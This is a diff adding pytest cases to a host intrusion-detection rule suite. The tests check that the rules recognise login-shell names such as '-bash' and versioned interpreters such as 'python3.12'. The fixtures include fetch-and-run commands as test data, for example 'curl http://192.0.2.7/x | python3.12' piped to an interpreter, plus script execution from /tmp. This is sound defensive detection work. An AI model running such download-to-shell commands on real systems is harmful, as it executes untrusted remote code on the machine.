@@ -56,6 +56,19 @@ def test_common_stdin_shell_shape_keeps_every_indicator_event():
     assert all(match.events == [event] for match, event in zip(matches, events, strict=True))
 
 
+@pytest.mark.parametrize("argv", [
+    ["-bash"],
+    ["-sh"],
+    ["python3.12"],
+])
+def test_web_user_login_and_versioned_interpreter_names_are_normalized(argv):
+    matches = run(host.WebServiceSpawnsInterpreter, [exec_ev(argv, user="www-data")])
+
+    assert len(matches) == 1
+    assert matches[0].proposed_lane == "urgent"
+    assert matches[0].severity == "critical"
+
+
 def test_indicator_after_shape_and_example_limits_is_not_hidden():
     prefix = "padding = 'this prefix is deliberately longer than forty eight characters'\n"
     benign_code = prefix + "print(padding)"
@@ -181,6 +194,14 @@ def test_downloader_sequence_spans_partitions():
     assert len(pb.finalize()) == 1
 
 
+@pytest.mark.parametrize("argv", [["-bash"], ["python3.12"]])
+def test_downloader_sequence_normalizes_interpreter_name(argv):
+    downloader = exec_ev(["curl", "http://192.0.2.7/x"], process__ppid=7)
+    interpreter = exec_ev(argv, process__ppid=7, ts=T0 + timedelta(seconds=1))
+
+    assert len(run(host.DownloaderFeedsInterpreter, [downloader, interpreter])) == 1
+
+
 @pytest.mark.parametrize("argv,user", [
     (["/bin/sh", "-c", "id"], "root"),                      # not a web account
     (["/usr/bin/zmu", "-m", "1"], "www-data"),              # web user, non-interpreter helper
@@ -210,6 +231,15 @@ def test_download_pipe_to_shell_found_and_wording_is_restrained():
     m = run(host.DownloadPipedToShell, [exec_ev(["/bin/sh", "-c", "curl http://192.0.2.7/TODO.md | sh"])])
     assert len(m) == 1 and m[0].proposed_lane == "urgent"
     assert "not established" in m[0].claim
+
+
+def test_download_pipe_recognizes_versioned_interpreter_name():
+    matches = run(
+        host.DownloadPipedToShell,
+        [exec_ev(["/bin/sh", "-c", "curl http://192.0.2.7/x | python3.12"])],
+    )
+
+    assert len(matches) == 1
 
 
 @pytest.mark.parametrize("argv", [
@@ -447,6 +477,13 @@ def test_exec_from_tmp_via_interpreter_script():
     assert len(m) == 1 and "via interpreter 'sh'" in m[0].claim
     # sh -c with a script string is not a script file
     assert run(host.ExecFromTempDir, [exec_ev(["/bin/sh", "-c", "./x"], process__cwd="/tmp")]) == []
+
+
+def test_exec_from_tmp_normalizes_login_shell_name():
+    matches = run(host.ExecFromTempDir, [exec_ev(["-bash", "/tmp/x.sh"])])
+
+    assert len(matches) == 1
+    assert "via interpreter 'bash'" in matches[0].claim
 
 
 @pytest.mark.parametrize("argv", [
